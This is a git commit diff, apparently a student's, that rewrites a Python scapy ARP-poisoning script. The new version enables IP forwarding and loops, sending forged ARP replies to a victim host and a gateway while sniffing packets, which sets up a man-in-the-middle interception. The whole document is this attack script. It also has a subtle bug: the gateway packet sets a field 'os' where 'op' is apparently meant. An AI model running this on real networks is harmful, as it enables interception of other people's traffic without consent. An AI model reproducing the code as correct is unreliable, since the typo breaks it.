ff4a90aa1f950b87f2818025c84ef6601717b83e
corentin <corentin.guillard@ynov.com>
2019-02-27 16:18:32 +0100

    modif script.py

--- script.py
+++ script.py
@@ -1,28 +1,28 @@
 #!/usr/bin/python
 
-# Python arp poison example script
-# Written by aviran
-# visit for more details aviran.org
-
 from scapy.all import *
 import sys
 
-def get_mac_address():
-    my_macs = [get_if_hwaddr(i) for i in get_if_list()]
-    for mac in my_macs:
-        if(mac != "00:00:00:00:00:00"):
-            return mac
-Timeout=2
 
 if len(sys.argv) != 3:
     print "Usage: arp_poison.py HOST_TO_ATTACK HOST_TO_IMPERSONATE"
     sys.exit(1)
 
-my_mac = get_mac_address()
-if not my_mac:
-    print "Cant get local mac address, quitting"
-    sys.exit(1)
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-packet = Ether()/ARP(op="who-has",hwsrc=my_mac,psrc=sys.argv[2],pdst=sys.argv[1])
+victim_packet = ARP()
+victim_packet.op = 2
+victim_packet.psrc = sys.argv[2]
+victim_packet.pdst = sys.argv[1]
+gateway_packet = ARP()
+gateway_packet.os = 2
+gateway_packet.psrc = sys.argv[1]
+gateway_packet.pdst = sys.argv[2]
 
-sendp(packet, loop=1, inter=0.2)
+while True:
+    try:
+        send(victim_packet, verbose=1)
+        send(gateway_packet, verbose=1)
+        sniff(iface=("eth0"), count=1, prn=lambda x: x.summary())
+    except KeyboardInterrupt:
+        break
